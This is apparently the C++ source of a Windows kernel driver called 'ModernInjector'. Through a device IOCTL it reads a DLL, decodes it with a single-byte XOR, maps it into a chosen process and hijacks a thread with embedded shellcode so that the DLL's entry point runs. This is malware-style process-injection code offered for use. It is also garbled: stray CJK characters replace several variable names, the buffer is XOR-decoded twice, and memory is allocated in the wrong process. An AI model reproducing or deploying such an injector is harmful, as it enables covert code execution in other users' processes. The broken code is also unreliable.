#include <ntifs.h>
#include <ntimage.h>
#include <ntstrsafe.h>

#define DEVICE_NAME L"\\Device\\ModernInjector"
#define SYMLINK_NAME L"\\DosDevices\\ModernInjector"
#define IOCTL_INJECT_DLL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define POOL_TAG 'DLLX'

struct InjectionRequest {
    ULONG TargetPid;
    WCHAR DllPath[260];
};

constexpr UCHAR XOR_KEY = 0x5A;

inline void XorBuffer(PUCHAR buffer, SIZE_T size, UCHAR key) {
    for (SIZE_T i = 0; i < size; i++) {
        buffer[i] ^= key;
    }
}

struct HandleCloser {
    HANDLE handle;
    HandleCloser(HANDLE h) : handle(h) {}
    ~HandleCloser() { if (handle) ZwClose(handle); }
};

NTSTATUS InjectDll(PEPROCESS targetProcess, PUCHAR dllData, SIZE_T dllSize) {
    NTSTATUS status = STATUS_SUCCESS;
    PVOID remoteBase = nullptr;
    SIZE_T regionSize = dllSize;

    XorBuffer(dllData, dllSize, XOR_KEY);

    auto* dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(dllData);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        DbgPrint("Invalid DOS signature\n");
        return STATUS_INVALID_IMAGE_FORMAT;
    }
    auto* ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(dllData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        DbgPrint("Invalid NT signature\n");
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &remoteBase, 0, 展onSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Failed to allocate memory: 0x%X\n", status);
        return status;
    }

    ULONG delta = static_cast<ULONG>(reinterpret_cast<PUCHAR>(remoteBase) - ntHeaders->OptionalHeader.ImageBase);
    if (delta != 0 && ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        auto* reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
            dllData + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress) {
            auto* relocInfo = reinterpret_cast<PWORD>(reloc + 1);
            ULONG numRelocs = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (ULONG i = 0; i < numRelocs; i++) {
                if ((relocInfo[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                    auto* fixup = reinterpret_cast<PULONG>(dllData + reloc->VirtualAddress + (relocInfo[i] & 0xFFF));
                    *fixup += delta;
                }
            }
            reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<PUCHAR>(reloc) + reloc->SizeOfBlock);
        }
    }

    KAPC_STATE apcState;
    KeStackAttachProcess(targetProcess, &apcState);

    status = ZwWriteVirtualMemory(ZwCurrentProcess(), remoteBase, dllData,
        ntHeaders->OptionalHeader.SizeOfHeaders, nullptr);
    if (!NT_SUCCESS(status)) {
        KeUnstackDetachProcess(&apcState);
        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteBase, 展onSize, MEM_RELEASE);
        DbgPrint("Failed to write headers: 0x%X\n", status);
        return status;
    }

    auto* section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        status = ZwWriteVirtualMemory(ZwCurrentProcess(),
            reinterpret_cast<PVOID>(reinterpret_cast<PUCHAR>(remoteBase) + section[i].VirtualAddress),
            dllData + section[i].PointerToRawData,
            section[i].SizeOfRawData, nullptr);
        if (!NT_SUCCESS(status)) {
            KeUnstackDetachProcess(&apcState);
            ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteBase, 展onSize, MEM_RELEASE);
            DbgPrint("Failed to write section %d: 0x%X\n", i, status);
            return status;
        }
    }

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            PVOID sectionBase = reinterpret_cast<PVOID>(reinterpret_cast<PUCHAR>(remoteBase) + section[i].VirtualAddress);
            SIZE_T sectionSize = section[i].SizeOfRawData;
            ULONG oldProtect;
            ZwProtectVirtualMemory(ZwCurrentProcess(), 告onBase, 告onSize,
                PAGE_EXECUTE_READ, &oldProtect);
        }
    }

    KeUnstackDetachProcess(&apcState);

    PETHREAD thread;
    status = PsLookupThreadByThreadId(PsGetCurrentThreadId(), &thread);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Failed to get thread: 0x%X\n", status);
        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteBase, 展onSize, MEM_RELEASE);
        return status;
    }

    PVOID dllMain = reinterpret_cast<PVOID>(reinterpret_cast<PUCHAR>(remoteBase) + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    KeSuspendThread(thread);
    CONTEXT context{};
    context.ContextFlags = CONTEXT_FULL;
    status = KeGetContextThread(thread, &context);
    if (NT_SUCCESS(status)) {
        UCHAR shellcode[] = {
            0x48, 0x83, 0xEC, 0x20,
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x89, 0xC1,
            0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00,
            0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00,
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
            0xFF, 0xD0,
            0x48, 0x83, 0xC4, 0x20,
            0xC3
        };
        memcpy(shellcode + 6, &remoteBase, sizeof(PVOID));
        memcpy(shellcode + 23, &dllMain, sizeof(PVOID));

        PVOID shellcodeBase = nullptr;
        SIZE_T shellSize = sizeof(shellcode);
        status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcodeBase, 0, &shellSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (NT_SUCCESS(status)) {
            status = ZwWriteVirtualMemory(ZwCurrentProcess(), shellcodeBase, shellcode, sizeof(shellcode), nullptr);
            if (NT_SUCCESS(status)) {
                context.Rip = reinterpret_cast<DWORD64>(shellcodeBase);
                KeSetContextThread(thread, &context);
            }
        }
    }
    KeResumeThread(thread);
    ObDereferenceObject(thread);

    DbgPrint("DLL injected at 0x%p\n", remoteBase);
    return STATUS_SUCCESS;
}

extern "C" NTSTATUS DeviceControl(PDEVICE_OBJECT deviceObject, PIRP irp) {
    auto* irpStack = IoGetCurrentIrpStackLocation(irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bytesReturned = 0;

    if (irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_INJECT_DLL) {
        auto* request = reinterpret_cast<InjectionRequest*>(irp->AssociatedIrp.SystemBuffer);
        PEPROCESS targetProcess;

        status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(request->TargetPid), &targetProcess);
        if (!NT_SUCCESS(status)) {
            DbgPrint("Failed to find process %u: 0x%X\n", request->TargetPid, status);
            goto Cleanup;
        }

        UNICODE_STRING filePath;
        RtlInitUnicodeString(&filePath, request->DllPath);
        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);

        HANDLE fileHandle;
        IO_STATUS_BLOCK ioStatus;
        status = ZwCreateFile(&fileHandle, GENERIC_READ, &objAttr, &ioStatus, nullptr,
            FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0);
        HandleCloser closer(fileHandle);
        if (!NT_SUCCESS(status)) {
            DbgPrint("Failed to open DLL: 0x%X\n", status);
            ObDereferenceObject(targetProcess);
            goto Cleanup;
        }

        FILE_STANDARD_INFORMATION fileInfo;
        status = ZwQueryInformationFile(fileHandle, &ioStatus, &fileInfo, sizeof(fileInfo), FileStandardInformation);
        if (!NT_SUCCESS(status)) {
            ObDereferenceObject(targetProcess);
            goto Cleanup;
        }

        PUCHAR dllData = static_cast<PUCHAR>(ExAllocatePoolWithTag(PagedPool, fileInfo.EndOfFile.QuadPart, POOL_TAG));
        if (!dllData) {
            ObDereferenceObject(targetProcess);
            status = STATUS_INSUFFICIENT_RESOURCES;
            goto Cleanup;
        }

        status = ZwReadFile(fileHandle, nullptr, nullptr, nullptr, &ioStatus, dllData, fileInfo.EndOfFile.QuadPart, nullptr, nullptr);
        if (NT_SUCCESS(status)) {
            XorBuffer(dllData, fileInfo.EndOfFile.QuadPart, XOR_KEY);
            status = InjectDll(targetProcess, dllData, fileInfo.EndOfFile.QuadPart);
        }

        ExFreePoolWithTag(dllData, POOL_TAG);
        ObDereferenceObject(targetProcess);
    }

Cleanup:
    irp->IoStatus.Status = status;
    irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
    UNREFERENCED_PARAMETER(registryPath);
    UNICODE_STRING deviceName, symLink;
    PDEVICE_OBJECT deviceObject;

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    NTSTATUS status = IoCreateDevice(driverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    IoCreateSymbolicLink(&symLink, &deviceName);

    driverObject->MajorFunction[IRP_MJ_CREATE] = driverObject->MajorFunction[IRP_MJ_CLOSE] =
        [](PDEVICE_OBJECT, PIRP irp) -> NTSTATUS {
        irp->IoStatus.Status = STATUS_SUCCESS;
        IoCompleteRequest(irp, IO_NO_INCREMENT);
        return STATUS_SUCCESS;
    };
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    driverObject->DriverUnload = [](PDRIVER_OBJECT drvObj) {
        UNICODE_STRING symLink;
        RtlInitUnicodeString(&symLink, SYMLINK_NAME);
        IoDeleteSymbolicLink(&symLink);
        IoDeleteDevice(drvObj->DeviceObject);
    };

    DbgPrint("ModernInjector loaded\n");
    return STATUS_SUCCESS;
}